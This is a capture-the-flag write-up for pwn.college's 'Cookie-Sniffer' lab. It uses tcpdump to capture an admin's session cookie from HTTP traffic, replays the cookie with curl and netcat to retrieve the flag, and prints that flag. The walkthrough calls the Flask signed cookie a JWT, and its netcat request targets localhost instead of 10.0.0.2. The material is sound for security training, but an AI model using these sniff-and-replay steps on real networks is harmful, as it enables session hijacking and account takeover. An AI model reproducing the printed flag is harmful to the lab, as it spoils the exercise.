---
layout: page
title: "Cookie-Sniffer 🕵️‍♂️🍪"
summary: "Writeup from Intercepting Communication"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Intercepting Communication"
date: 2026-04-27
---


## 🧠 Task Description

**Challenge Name:** Cookie-Sniffer  
**Platform:** pwn.college  
**Goal:** Steal the admin's session cookie and use it to retrieve the flag from the server.

> 💡 *Hint from challenge:*  
> Use your full set of HTTP tools (e.g., `curl`, `nc`, `tcpdump`, etc.) to steal and use the cookie. Make sure to run everything in the terminal on `10.0.0.1`!

---

## 🔍 Reconnaissance

By examining `/challenge/run`, we see a Python-based setup using Flask to simulate a login system and session management.

### Key points from `run` script:
- Admin logs in to `http://10.0.0.2/login` with a randomly generated password.
- A Flask session is created for the user with a secret key.
- `/flag` endpoint only responds if the user is `"admin"` in session.

The goal is clear: **Sniff the traffic, find the session cookie, and use it to access `/flag`.**

---

## 📡 Exploitation: Sniff the Admin Cookie

We start by running `tcpdump` to intercept HTTP traffic to/from the server.

```bash
root@ip-10-0-0-1:~# tcpdump -i eth0 -A host 10.0.0.2 and port 80 | grep Cookie
```
Captured Cookie:
```
Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aIpVMw.xUesKcudRDiq9j9kKh2eAxLrOLo
```
The cookie includes a session JWT with user=admin.

---

## Accessing the Flag
### Option 1: Using curl
```bash
curl -b "session=eyJ1c2VyIjoiYWRtaW4ifQ.aIpVMw.xUesKcudRDiq9j9kKh2eAxLrOLo" http://10.0.0.2/flag
```
Output:
```
pwn.college{41-255x-yJ6Y3i06sHOi-hYSeFY.0VM0AjNxwSM0IzMyEzW}
```
### Option 2: Using nc (netcat)
```bash
printf "GET /flag HTTP/1.0\r\nHost:localhost\r\nCookie:session=eyJ1c2VyIjoiYWRtaW4ifQ.aIpVMw.xUesKcudRDiq9j9kKh2eAxLrOLo\r\n\r\n" | nc localhost 80
```
This also works, but curl is easier and cleaner.
---
## Flag
```bash
pwn.college{41-255x-yJ6Y3i06sHOi-hYSeFY.0VM0AjNxwSM0IzMyEzW}
```
---
